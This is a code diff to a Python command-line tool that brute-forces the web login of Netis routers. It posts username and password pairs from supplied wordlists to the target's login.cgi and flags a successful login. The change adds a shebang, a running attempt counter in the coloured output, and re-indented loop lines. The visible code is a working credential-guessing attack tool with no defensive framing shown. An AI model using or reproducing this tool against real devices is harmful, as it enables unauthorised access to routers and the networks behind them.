@@ -1,3 +1,5 @@
+#!/usr/bin/python3
+
 from requests import post,get
 from sys import argv
 from termcolor import cprint
@@ -38,6 +40,7 @@ def Netis():
 	if argv[1].lower() == "--help" or argv[1].lower() == "-h":	Error()
 	Banner()
 	url="http://"+argv[1]+"/login.cgi"
+	count=1
 	if len(argv) == 4:
 		First_Packet()
 		try:
@@ -52,9 +55,10 @@ def Netis():
 			try:	r=post(url, data=f"username={Username}&password={Password}&submit.htm")
 			except KeyboardInterrupt:	cprint("Stopped by the user.","yellow","on_red",attrs=["bold"]),exit()
 			except:	cprint("Error: Unknown Error, makesure that there's no empty line.","red",attrs=["bold"]),exit()
-			if "Username or password error, try again!" in str(r.content):	cprint("[-]","red",attrs=["bold"],end=" "),cprint(f"Invalid data, {Username}:{Password}.","grey",attrs=["bold"])
-			else:	cprint("----------------------------------","white",attrs=["bold"]),cprint("[+]","green",attrs=["bold"],end=" "),cprint(f"Logged in, {Username}:{Password}.","grey",attrs=["bold"]),cprint("----------------------------------","white",attrs=["bold"]),quit()
-		cprint("[!] ","yellow",attrs=["bold"],end=""),cprint("Finished without any results.","cyan",attrs=["bold"])
+			if "Username or password error, try again!" in str(r.content):	cprint("[","red",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","red",attrs=["bold"],end=" "),cprint(f"Invalid data, {Username}:{Password}.","grey",attrs=["bold"])
+			else:	cprint("----------------------------------","white",attrs=["bold"]),cprint("[","green",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","green",attrs=["bold"],end=" "),cprint(f"Logged in, {Username}:{Password}.","grey",attrs=["bold"]),cprint("----------------------------------","white",attrs=["bold"]),quit()
+			count+=1
+		cprint("[","yellow",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","yellow",attrs=["bold"],end=" "),cprint("Finished without any results.","cyan",attrs=["bold"])
 	elif len(argv) == 5:
 		First_Packet()
 		try:
@@ -62,14 +66,15 @@ def Netis():
 			file2=open(argv[4],"r",encoding='latin-1')
 		except:	cprint("Error: File not found.","red",attrs=["bold"]),exit()
 		for Line1,Line2 in zip(file1.readlines(),file2.readlines()):
-				UsernamE=Line1.strip()
-				PassworD=Line2.strip()
-				try:	R=post(url, data=f"username={UsernamE}&password={PassworD}&submit.htm")
-				except KeyboardInterrupt:	cprint("Stopped by the user.","yellow","on_red",attrs=["bold"]),exit()
-				except: cprint("Error: Unknown Error, makesure that there's no empty line.","red",attrs=["bold"]),exit()
-				if "Username or password error, try again!" in str(R.content):	cprint("[-]","red",attrs=["bold"],end=" "),cprint(f"Invalid data, {UsernamE}:{PassworD}.","grey",attrs=["bold"])
-				else:	cprint("----------------------------------","white",attrs=["bold"]),cprint("[+]","green",attrs=["bold"],end=" "),cprint(f"Logged in, {UsernamE}:{PassworD}.","grey",attrs=["bold"]),cprint("----------------------------------","white",attrs=["bold"]),quit()
-		cprint("[!] ","yellow",attrs=["bold"],end=""),cprint("Finished without any results.","cyan",attrs=["bold"])
+			UsernamE=Line1.strip()
+			PassworD=Line2.strip()
+			try:	R=post(url, data=f"username={UsernamE}&password={PassworD}&submit.htm")
+			except KeyboardInterrupt:	cprint("Stopped by the user.","yellow","on_red",attrs=["bold"]),exit()
+			except: cprint("Error: Unknown Error, makesure that there's no empty line.","red",attrs=["bold"]),exit()
+			if "Username or password error, try again!" in str(R.content):	cprint("[","red",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","red",attrs=["bold"],end=" "),cprint(f"Invalid data, {UsernamE}:{PassworD}.","grey",attrs=["bold"])
+			else:	cprint("----------------------------------","white",attrs=["bold"]),cprint("[","green",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","green",attrs=["bold"],end=" "),cprint(f"Logged in, {UsernamE}:{PassworD}.","grey",attrs=["bold"]),cprint("----------------------------------","white",attrs=["bold"]),quit()
+			count+=1
+		cprint("[","yellow",attrs=["bold"],end=""),cprint(count,"white",attrs=["bold"],end=""),cprint("]","yellow",attrs=["bold"],end=" "),cprint("Finished without any results.","cyan",attrs=["bold"])
 	else:	Error()
 
 if __name__ == "__main__":
